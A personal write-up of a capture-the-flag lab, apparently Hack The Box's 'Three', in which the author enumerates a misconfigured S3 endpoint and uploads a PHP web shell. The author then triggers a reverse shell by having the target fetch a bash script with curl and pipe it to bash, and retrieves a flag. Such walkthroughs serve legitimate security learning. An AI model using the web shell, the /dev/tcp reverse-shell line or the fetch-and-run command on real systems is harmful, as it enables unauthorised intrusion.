@@ -1,0 +1,208 @@
+Many organisations store data in the cloud.
+
+This exercise focuses on a website that utilises an AWS S3 bucket as its cloud storage
+device.
+
+The assumption is that this AWS S3 bucket has been poorly configured. Our goal is to
+upload a reverse shell and retrieve the flag
+
+sudo nmap -sV <ip address>
+returns us two open ports: 22 and 80:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Since http is running on port 80, we can access the website on the browser.
+
+It is a static website that is featuring information regarding a band.
+
+As we scroll down, we can see a domain via the email portion:
+
+Email: mail@thetoppers.htb
+
+At this point, for Linux machines, the /etc/hosts files is queried before the DNS server
+for hostname resolution. As such, we need to make changes such that the DNS server is
+queried first.
+
+To do so, we add to the file: echo "<virtual machine ip address> thetoppers.htb" | sudo tee -a /etc/hosts
+
+The tee name: interpret it as a T-splitter. So data will flow and then split into two streams.
+Before it splits into two streams, it is duplicated. So the two streams have duplicated data of the original.
+
+So the above command echo "<virtual machine ip address> thetoppers.htb" | sudo tee -a /etc/hosts
+will append the output of the echo to the file. -a means append.
+Without -a, the contents within /etc/hosts will be replaced by the echo output.
+
+Next, the exercise discusses about sub-domain enumeration.
+
+It is prepended before the domain name:
+
+ctf.hackthebox.com -> ctf is the subdomain; hackthebox is the domain.
+Naturally, .com is the top-level domain (TLD).
+
+Subdomains usually have different IP addresses.
+When a client tries to look up the subdomain, it gets the address of the server handling the
+application.
+
+A server can also handle multiple subdomains - "host-based routing" or "virtual host routing".
+In this case, the server looks at the header for "Host" to determine which application is meant to
+handle the request.
+
+Our goal here is to figure out more information - whether there are many more subdomains apart from
+this in the server.
+
+We run:
+gobuster vhost -w wordListPath -u http://thetoppers.htb
+
+vhost checks if the subdomains exist by visiting the formed URL and cross-checking the IP address. 
+
+Somehow, i have a weird error that does not seem to run the above command.
+
+I used ffuf instead: https://github.com/ffuf/ffuf?tab=readme-ov-file:
+ffuf -u http://thetoppers.htb -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ" -fs 4242 > results.txt
+
+then i check for words with "s3": grep s3 results.txt.
+
+Here, we have to add it back into the /etc/hosts file
+echo "<virtual machine ip address> s3.thetoppers.htb" | sudo tee -a /etc/hosts
+
+Then navigating to http://s3.thetoppers.htb presents us with a webpage with message:
+{"status": "running"}, a JSON object
+
+S3 is a cloud-storage service.
+The term for the container is called buckets
+Amazon is the company for this service; the service is called AWS
+
+There are many categories of S3 buckets: backup, storage, media hosting, software delivery, static website and more
+
+There is an interface tool: awscli.
+
+Then we run aws configure: to be able to configure fields used for accessing an AWS S3 endpoint:
+sean@SeanLaptop:~$ aws configure
+AWS Access Key ID [None]: temp
+AWS Secret Access Key [None]: temp
+Default region name [None]: temp
+Default output format [None]: temp
+
+We set all to temp first, just in the exercise.
+If the server is not configured properly, it may not check authentication.
+
+Then, we can list all the S3 buckets of a server: aws --endpoint=http://s3.thetoppers.htb s3 ls:
+More specifically, it lists all S3 buckets with one's account (the details above)
+
+sean@SeanLaptop:~$ aws --endpoint=http://s3.thetoppers.htb s3 ls
+2024-02-06 19:32:48 thetoppers.htb
+
+So here, we can see that we can only access s3.thetoppers.htb with our credentials above (the details above)
+
+Then, we can list all objects within a bucket.
+The bucket name that we have is thetoppers.htb
+
+aws s3 ls s3://<bucket name>
+
+is the syntax.
+ls s3:// signifies that you are listing all objects under the specified <bucket name>
+
+Running the command: aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+We get:
+
+                           PRE images/
+2024-02-06 19:32:48          0 .htaccess
+2024-02-06 19:32:48      11952 index.php
+
+We see .htaccess: suggests Apache-based webservers.
+
+So the idea now is to upload a PHP code to the bucket. Then when we visit the webpage: the server will execute
+this code:
+
+<?php system($_GET["cmd"]); ?>
+
+The idea is that:
+The attacker sends a GET request like http://example.com/script.php?cmd=ls, the server will execute the
+ls command and return the output to the attacker
+
+We have to first create the PHP file.
+Since it is a one-liner, we can do it in the terminal: echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+This creates a file "shell.php".
+
+We can do so using awscli to upload: 
+
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+
+This means: copy the file (cp) shell.php to ONE of possibly many s3 buckets hosted on the server called
+http://s3.thetoppers.htb. Then the last section specifies WHICH s3 bucket object: thetoppers.htb
+
+We run this:
+sean@SeanLaptop:~$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+upload: ./shell.php to s3://thetoppers.htb/shell.php
+
+Then, when we navigate to http://thetoppers.htb/shell.php, we see nothing, but no error message.
+Since there is a response, it loaded successfully.
+Now, we just need to append a query parameter called cmd since this is used in the script.
+It will be run by the server.
+
+By setting the command id, we make the server run id in its terminal; and output its results on the webpage.
+We see:
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+The last part of this exercise is to make this machine connect to ours via a reverse shell.
+
+The idea is to create a shell script on our machine
+Then we can make the server run it by connecting it to our machine and executing the shell script on our machine.
+
+We use a shell script this time: to create > touch shell.sh
+Then we edit the file:
+
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+
+The first line means that Bash interpreter should be used to execute the script
+
+>& redirects stdin and stderr of the shell to my ip address.
+1337 is the port.
+0 >& 1 then means that stdin of the shell is to be redirected to the same location as stdout.
+
+https://www.gnu.org/software/bash/manual/bash.html
+-i is interactive. This means the shell accepts typed input from the keyboard
+
+Then we listen on port 1337 using netcat:
+nc -nvlp 1337
+
+Meaning of parameter -nvlp: https://medium.com/@PenTest_duck/offensive-netcat-ncat-from-port-scanning-to-bind-shell-ip-whitelisting-834689b103da
+-n means disable DNS resolution; netcat will not attempt to resolve IP addresses to hostnames.
+-v means verbose mode; show more information
+-l means listening mode. You should provide a port. If you do not specify the port, then it will listen on all ports.
+-p means liston on a particular port.
+When you chain them lp together, you will listen on all interfaces on port 1337
+
+We do this so that we can later run a command from the server to connect to this
+
+The bash script we wrote will make the server establish a connection with our machine.
+
+The exercise then, because of the need to host the script, creates a web server to host the shell script.
+The web server created is done via Python:
+python3 -m http.server 8000
+
+So now, when we make the server run the curl command, it will visit our web server and run the shell script located
+in the same directory as the web server.
+Hence the last step is to do this:
+http://thetoppers.htb/shell.php?cmd=curl%20%3C<my ip address here>%3E:8000/shell.sh|bash
+
+Then, when we observe the terminal with netcat, we see that we are successfully connected:
+
+sean@SeanLaptop:~$ nc -nvlp 1337
+Listening on 0.0.0.0 1337
+Connection received on <ip address> 44836
+bash: cannot set terminal process group (1647): Inappropriate ioctl for device
+bash: no job control in this shell
+
+Then i run cat /var/www/flag.txt as per in the exercise to obtain the flag:
+www-data@three:/var/www/html$ cat /var/www/flag.txt
+
+which returns
+a980d99281a28d638ac68b9bf9453c2b
+
+At this point, i decided to do more track-based boxes.
